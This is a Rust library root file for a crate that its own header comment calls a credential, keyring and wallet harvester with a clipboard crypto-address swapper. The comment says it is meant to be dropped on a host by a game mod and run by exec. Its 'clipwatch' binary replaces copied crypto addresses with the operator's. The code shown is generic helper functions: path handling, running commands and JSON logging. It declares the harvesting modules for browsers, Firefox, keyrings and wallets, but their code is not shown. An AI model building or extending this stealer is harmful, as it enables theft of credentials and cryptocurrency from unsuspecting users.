//! Credential, keyring, and wallet harvester with a clipboard address swapper.
//!
//! The crate is deliberately dependency-light and command-driven so it can be
//! dropped on a host by a mod and run by `exec`. It has two binaries:
//! `harvest` (collect once) and `clipwatch` (poll, detect a crypto address, and
//! replace it with the operator's).

#![deny(unsafe_code)]

pub mod addr;
pub mod browser;
pub mod clip;
pub mod firefox;
pub mod keyring;
pub mod wallets;

use std::{
    fs,
    io::{self, Write},
    path::{Path, PathBuf},
    time::{SystemTime, UNIX_EPOCH},
};

/// Hard cap for a single harvested file copied into the output directory.
pub const MAX_ARTIFACT_BYTES: u64 = 16 * 1024 * 1024;

/// Returns the current Unix time in seconds.
pub fn now() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|value| value.as_secs())
        .unwrap_or(0)
}

/// Expands a leading `~` to `$HOME` and returns `None` when the root is absent.
pub fn home() -> Option<PathBuf> {
    std::env::var_os("HOME")
        .or_else(|| std::env::var_os("USERPROFILE"))
        .map(PathBuf::from)
}

/// Creates a directory and returns it.
pub fn make_dir(path: &Path) -> io::Result<PathBuf> {
    fs::create_dir_all(path)?;
    Ok(path.to_path_buf())
}

/// Runs a command and returns trimmed stdout, or `None` on any failure.
pub fn run(command: &str, args: &[&str]) -> Option<String> {
    let output = std::process::Command::new(command)
        .args(args)
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    String::from_utf8(output.stdout).ok()
}

/// Appends one JSON line to a log file, creating parents.
pub fn log_line(path: &Path, value: &serde_json::Value) {
    if let Some(parent) = path.parent() {
        let _ = fs::create_dir_all(parent);
    }
    if let Ok(mut file) = fs::OpenOptions::new().create(true).append(true).open(path) {
        let _ = writeln!(file, "{value}");
    }
}

/// Returns a filename-safe rendering of a source path.
pub fn flatten(path: &Path) -> String {
    let text = path.to_string_lossy();
    text.trim_start_matches('/')
        .replace(['\\', '/', ':'], "_")
        .chars()
        .take(180)
        .collect()
}
